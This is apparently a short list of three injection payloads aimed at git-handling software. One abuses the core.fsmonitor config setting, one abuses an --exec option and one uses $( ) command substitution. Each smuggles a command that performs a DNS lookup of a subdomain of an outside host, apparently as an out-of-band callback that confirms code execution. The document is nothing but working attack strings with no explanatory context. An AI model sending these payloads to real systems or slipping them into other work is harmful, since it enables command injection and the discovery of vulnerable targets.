    - "-c core.fsmonitor=getent hosts fsmonitor2.gi1.ssrf.xixixo123.site"
    - "--exec=getent hosts exec.gi1.ssrf.xixixo123.site"
    - "$(getent hosts subst.gi1.ssrf.xixixo123.site)"
